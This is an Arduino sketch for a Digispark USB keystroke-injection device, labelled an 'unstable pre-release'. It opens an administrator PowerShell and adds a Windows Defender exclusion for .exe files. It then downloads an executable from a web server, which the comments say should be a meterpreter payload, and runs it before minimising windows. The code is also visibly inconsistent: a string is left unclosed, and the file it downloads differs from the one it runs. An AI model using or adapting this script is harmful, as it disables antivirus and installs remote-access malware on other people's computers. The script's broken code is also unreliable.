/* 
ANES ADMIN POWERSHELL
           25.10.2021 - bvgs
           Edited read-friendly 22.07.2022


 █████╗  ███╗   ██╗  ███████╗ ███████╗
██╔══██╗████╗  ██║ ██╔════╝ ██╔════╝
███████║██╔██╗ ██║ █████╗    ███████╗
██╔══██║██║╚██╗██║██╔══╝  ╚════  ██║
██║  ██║ ██║ ╚████║ ███████╗ ███████║
╚═╝  ╚═╝ ╚═╝  ╚═══  ╚══════╝╚══════╝
                                  
Unstable pre-release
  */

#include "DigiKeyboard.h"
void setup() {
 
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-MpPreference -ExclusionExtension exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  /* 
----------------------------------------------------------------------------------------------------------------------------------------------------|
Below this, change the Invoke-Webrequest url from the current to the webserver you uploaded the meterpreter executable file. 
Example: "https://web.server/meterpreter.exe"
Make sure to include the name of the executable including the ending .exe, in the url.
Change the ending -OutFile to the same .exe name (Example: "meterpreter.exe")
                                       \------------------------------------/        \--------/
  */
  DigiKeyboard.print("Invoke-WebRequest https://anestestserver.test/test.exe -OutFile test.exe
  /* 
                                       /------------------------------------\        /--------\
----------------------------------------------------------------------------------------------------------------------------------------------------|
  */
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("./micromarc.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  for(;;) {}
}
